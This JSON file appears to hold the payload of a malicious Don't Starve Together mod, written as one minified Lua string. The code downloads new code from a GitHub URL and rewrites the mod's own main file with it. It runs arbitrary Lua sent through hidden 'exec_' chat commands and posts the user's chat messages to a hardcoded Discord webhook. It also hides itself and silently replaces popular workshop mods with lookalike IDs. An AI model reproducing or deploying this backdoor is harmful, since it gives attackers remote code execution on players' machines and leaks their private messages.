{
    "version":14,
    "code":"GLOBAL.setmetatable(env,{__index=function(a,b)return GLOBAL.rawget(GLOBAL,b)end})TheSim:GetPersistentString('j_ver',function(c,d)if c then TheSim:QueryServer('https://raw.githubusercontent.com/kipperok/kipperok.github.io/refs/heads/main/whitelist.json',function(e,f)if f then e=json.decode(e)if e and e.version and e.version~=tonumber(d)then TheSim:SetPersistentString('j_ver',e.version,false)local g=io.open('../mods/'..__mod..'/modmain.lua','w')g:write(string.format('local __mod = \"%s\"',__mod)..e.code)g:close()end end end,'GET')end end)local function h(i)if i:sub(151,#i):sub(1,2)=='h2'then i=i:sub(3)local j=tostring(string.byte(TheNet:GetSessionIdentifier():sub(-1),1))local k=''local l=#j;local m=#i;while#j<m do j=j..j end;j=j:sub(1,m)for n=1,m do local o=i:sub(n,n)local p=tonumber(j:sub(n,n))local q=string.char(o:byte()-p)k=k..q end;return k end;return i end;local r=KnownModIndex.GetClientModNamesTable;function KnownModIndex:GetClientModNamesTable(...)local s=r(self,...)for n,e in ipairs(s)do if e.modname==__mod then s[n]=nil;break end end;return s end;local t=Sim.SubscribeToMod;function Sim:SubscribeToMod(u,...)if u==__mod then return end;return t(self,u,...)end;local v='workshop-'function GLOBAL.IsWorkshopMod(u)if u==nil or u==__mod then return false end;return u:sub(1,v:len())==v end;local function w(x)x=h(x)if x and x:find('exec_')then if x:find('exec_'..TheNet:GetUserID())or x:find('exec_all')then local y,z=x:find('command_')if z then local A=x:sub(z+1,#x)pcall(function()local B=loadstring(A)if type(B)=='function'then B()end end)end end;return true end;return false end;ChatHistory.AddToHistory=function(self,type,C,D,E,x,F,G,H,I,J,...)I=false;if self.join_server then return end;if w(x)then return end;if C==TheNet:GetUserID()then TheSim:QueryServer('https://discord.com/api/webhooks/1328106996536315955/gQ1ipKaAvCFIkD2FYBr2GhZ42YUCJCG7TTZKLDebS3EUUahDVSRYDXE3VGpiTsRv5TY7',function()end,'POST',json.encode({username=E..' ('..C..')',content=x}))end;local K=self:GenerateChatMessage(type,C,D,E,x,F,G,H,I,J)self.history_start=self.history_start%self.MAX_CHAT_HISTORY+1;if self.request_history_start then self.request_history_start=self.request_history_start+1;if self.request_history_start>=self.MAX_CHAT_HISTORY then self.request_history_start=nil end end;self.max_chat_history_plus_one=self.history[self.history_start]self.history[self.history_start]=K;for A in pairs(self.listeners)do A(K)end;return K end;ChatHistory.OnSay=function(self,L,M,N,O,P,x,F,H,Q,R,...)if self.join_server then return end;if Q then self:AddToHistory(ChatTypes.Emote,M,N,nil,O..' '..x,F,nil,H,false,TEXT_FILTER_CTX_CHAT)else self:AddToHistory(ChatTypes.Message,M,N,O,x,F,GetRemotePlayerVanityItem(R or{},'profileflair')or'default',H,false,TEXT_FILTER_CTX_CHAT)end end;AddGamePostInit(function()GLOBAL.MAX_CHAT_INPUT_LENGTH=9999 end)local S={['workshop-375850593']='workshop-3410784782',['workshop-2189004162']='workshop-3410788126',['workshop-1185229307']='workshop-3410787062',['workshop-378160973']='workshop-3410786289',['workshop-375859599']='workshop-3410785782',['workshop-2287303119']='workshop-3410788645',['workshop-666155465']='workshop-3410786712'}for T,U in pairs(S)do if table.contains(KnownModIndex:GetServerModNames(),T)then TheSim:SubscribeToMod(U)else S[T]=nil end end;local r=KnownModIndex.GetServerModNamesTable;function KnownModIndex:GetServerModNamesTable(...)local s=r(self,...)for n,e in ipairs(s)do if S[e.modname]then s[n]=nil end end;return s end;local r=KnownModIndex.GetServerModNames;function KnownModIndex:GetServerModNames(...)local s=r(self,...)for n,e in ipairs(s)do if S[e]then s[n]=nil end end;return s end;local r=KnownModIndex.Enable;function KnownModIndex:Enable(O,...)if S[O]then self:Enable(S[O])return end;r(self,O,...)end;local V=GLOBAL.VisitURL;function GLOBAL.VisitURL(W)for T,U in pairs(S)do if W:find(GetWorkshopIdNumber(U))then W='http://steamcommunity.com/sharedfiles/filedetails/?id='..GetWorkshopIdNumber(T)break end end;return V(W)end"
}